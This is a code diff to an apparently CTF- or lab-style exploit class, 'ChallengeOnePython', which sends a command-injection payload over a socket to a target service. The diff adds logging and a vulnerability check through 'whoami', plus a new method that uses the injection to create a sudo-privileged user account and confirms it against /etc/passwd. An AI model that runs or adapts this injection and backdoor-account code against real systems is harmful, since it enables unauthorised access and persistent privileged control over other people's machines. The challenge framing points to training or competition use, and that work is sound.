@@ -24,6 +24,7 @@ class ChallengeOnePython(Exploit):
 			return False
 
 		exploit_command = f"ls; echo '0x1x2x3'; {command}" # echo 0x1x2x3 so we can parse for where the actual command injection output begins
+		logger.info(f"Running command `{exploit_command}`...")
 		socket_connection.sendall(exploit_command.encode())
 		socket_connection.shutdown(socket.SHUT_WR)
 		socket_response = ""
@@ -45,13 +46,33 @@ class ChallengeOnePython(Exploit):
 		Returns True if vulnerable and False if not
 		"""
 		try:
+			logger.info("Testing if the target is vulnerable to ChallengeOnePython...")
 			command = "whoami"
-			server_output = self.run_custom_command(command=command)
-			logger.info(f"Server output is `{server_output}`")
+			self.run_custom_command(command=command)
+			logger.info(f"{COLOR_OKGREEN}The target is vulnerable to ChallengeOnePython!{COLOR_END}")
 			return True
 		except PatchedException:
-			logger.info(f"{COLOR_FAIL}The target has been patched and Challenge One is no longer vulnerable.{COLOR_END}")
+			logger.info(f"{COLOR_FAIL}The target is not vulnerable to ChallengeOnePython.{COLOR_END}")
 			return False
 
-	def get_root(self):
-		return super().get_root()
+	def add_user(self, username):
+		"""
+		Adds a user to the target with sudo privileges.
+
+		idempotent: True
+
+		Returns True if the user is on the target, or False if not
+		"""
+		logger.info(f"Adding user `{username}` with sudo privileges...")
+		add_user_command = f"useradd -m {username} -g sudo -s /bin/bash 2>&1" # redirect stderr to stdout so it's returned to us
+		self.run_custom_command(add_user_command)
+
+		# validate that the user was successfully added
+		check_user_id_command = f"grep -c '^{username}:' /etc/passwd"
+		command_output = self.run_custom_command(check_user_id_command)
+		if command_output == "1":
+			logger.info(f"Successfully added `{username}` with sudo privileges.")
+			return True
+		else:
+			logger.info(f"Failed to add `{username}` with sudo privileges.")
+			return False
